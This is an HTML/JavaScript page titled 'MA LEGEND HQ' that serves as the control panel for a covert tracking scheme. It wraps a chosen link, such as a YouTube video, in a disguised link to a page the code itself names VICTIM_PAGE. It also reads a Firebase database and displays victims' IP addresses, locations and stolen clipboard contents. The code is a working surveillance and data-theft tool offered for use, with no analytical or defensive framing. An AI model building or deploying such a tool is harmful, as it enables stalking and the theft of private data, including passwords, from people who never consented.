<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>MA LEGEND HQ | FIXED</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@700&family=Poppins:wght@400;600&display=swap');
        body { background: #e0e5ec; font-family: 'Poppins', sans-serif; color: #44476a; padding: 15px; display: flex; justify-content: center; }
        .container { width: 100%; max-width: 600px; }
        .neu-card { background: #e0e5ec; padding: 25px; border-radius: 30px; box-shadow: 9px 9px 16px #bcbfc5, -9px -9px 16px #ffffff; margin-bottom: 25px; }
        h2 { font-family: 'Orbitron'; color: #00a884; text-align: center; }
        input { width: 100%; padding: 12px; border: none; border-radius: 12px; background: #e0e5ec; box-shadow: inset 4px 4px 8px #cbcbe1, inset -4px -4px 8px #ffffff; outline: none; margin: 8px 0; box-sizing: border-box; }
        .btn { width: 100%; padding: 12px; border: none; border-radius: 15px; background: #e0e5ec; box-shadow: 6px 6px 12px #bcbfc5, -6px -6px 12px #ffffff; color: #00a884; font-weight: bold; cursor: pointer; font-family: 'Orbitron'; margin-top: 10px; }
        .btn:active { box-shadow: inset 3px 3px 6px #bcbfc5, inset -3px -3px 6px #ffffff; }
        .log-card { background: #e0e5ec; padding: 15px; border-radius: 20px; box-shadow: 6px 6px 12px #bcbfc5, -6px -6px 12px #ffffff; margin-top: 15px; border-left: 6px solid #00a884; font-size: 0.8rem; }
        pre { background: #1e1e1e; color: #00ffcc; padding: 10px; border-radius: 10px; overflow-x: auto; white-space: pre-wrap; }
    </style>
</head>
<body>
    <div class="container">
        <div class="neu-card">
            <h2>MA LEGEND HQ</h2>
            <input type="text" id="masterKey" placeholder="Secret Key (e.g. Legend786)">
            <input type="text" id="targetUrl" placeholder="Target Link (YouTube etc)">
            <button class="btn" onclick="generateLink()">GENERATE LINK</button>
            <div id="result" style="display:none; margin-top:15px;">
                <input type="text" id="finalLink" readonly>
            </div>
        </div>
        <div style="display:flex; gap:10px;">
            <button class="btn" onclick="fetchData('tracking')">LOCATIONS</button>
            <button class="btn" onclick="fetchData('clipboard')">CLIPBOARD</button>
        </div>
        <div id="displayArea"></div>
    </div>

    <script>
        const DB_URL = "https://location-5d435-default-rtdb.firebaseio.com/";
        const VICTIM_PAGE = "https://video-obtg.vercel.app/";

        function generateLink() {
            const key = document.getElementById('masterKey').value.trim();
            const url = document.getElementById('targetUrl').value.trim();
            if(!key || !url) return alert("Fill details!");
            
            // Simple Base64 encoding for URL
            const payload = btoa(JSON.stringify({ k: key, r: url }));
            const fullLink = `${VICTIM_PAGE}?id=${payload}`;
            
            document.getElementById('finalLink').value = fullLink;
            document.getElementById('result').style.display = 'block';
        }

        async function fetchData(path) {
            const key = document.getElementById('masterKey').value.trim();
            const res = await fetch(`${DB_URL}${path}/${key}.json`);
            const data = await res.json();
            const area = document.getElementById('displayArea');
            area.innerHTML = "";
            if(!data) return area.innerHTML = "<p>No data found.</p>";
            Object.keys(data).reverse().forEach(id => {
                const item = data[id];
                area.innerHTML += `<div class="log-card"><b>${item.time}</b><br>${item.ip || ''} - ${item.loc || ''}<pre>${item.clipData || 'No Clip Data'}</pre></div>`;
            });
        }
    </script>
</body>
</html>
